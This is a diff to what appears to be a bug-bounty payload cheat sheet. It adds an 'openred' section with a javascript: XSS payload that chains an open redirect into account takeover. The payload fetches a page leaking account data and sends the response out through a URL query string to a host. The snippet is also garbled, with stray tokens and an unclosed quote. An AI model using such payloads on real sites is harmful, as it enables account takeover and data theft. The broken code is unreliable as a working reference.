@@ -8,6 +8,7 @@
 - [open redirect](#openRedict)
 - [shell upload](#shellupload)
 - [xss](#xss)
+- [openred](#openred)
 - [cros](#cros)
 - [take sub domain](#takeSub)
 - [Ssrf](#ssrf)
@@ -1154,7 +1155,24 @@ refer:https://exam.com</script>
 ```
 # the end
 
--
+### openred
+
+# openred to xss to take acoustic
+```
+javascript:alert(fetch
+(Paste a link that leaks account information IN RESPONSE')
+
+.then(response =>
+
+{ return response.text()})
+
+.then(data =>
+
+{ javascript:alert
+
+(window.location='http://localhost?data='+data)}))
+```
+[link](https://medium.com/@them7x/open-redirect-to-xss-and-account-takeover-ato-7ccd3a41d2a0)
 ### ssrf 
 -tool install 
 
